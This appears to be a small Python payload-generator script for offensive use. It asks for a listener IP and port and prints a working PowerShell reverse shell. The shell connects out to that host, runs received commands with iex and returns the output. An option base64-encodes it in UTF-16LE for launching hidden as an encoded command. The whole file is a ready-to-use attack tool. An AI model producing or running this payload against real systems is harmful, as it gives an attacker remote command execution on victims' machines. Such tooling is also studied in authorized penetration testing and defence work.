import base64

def reversepwsh():
    ip = input("Local Host IP: ")
    port = input("Local Host Port: ")
    payload = (
        f"$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]"
        "$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object "
        "-TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
    )

    return payload

def powershell():
    print("Using powershell option...")
    print("1. Reverse Shell")
    print("2. Reverse Shell (base64 encoded)")
    payload = "No option chosen!"
    option = input("Enter option number: ")
    
    if option == '1':
        print(f"Chosen option: {option}")
        payload = reversepwsh()
        print("Generating Powershell Reverse Shell...")
    
    elif option == '2':
        print(f"Chosen option: {option}")
        
        payload = base64.b64encode(reversepwsh().encode("utf-16le")).decode("ascii")
        print("Generating Base64 Powershell Reverse Shell...")
        
    else:
        print("nah bro")
    
    print("======================================")
    print(payload)
    print("======================================")

def loop():
    print("Payload Options:")
    print("1. Powershell")
    option = input("Enter option number: ")

    if option == '1':
        powershell()
    else:
        print("Unsupported option!")

def main():
    while True:
        loop()



if __name__ == "__main__":
    main()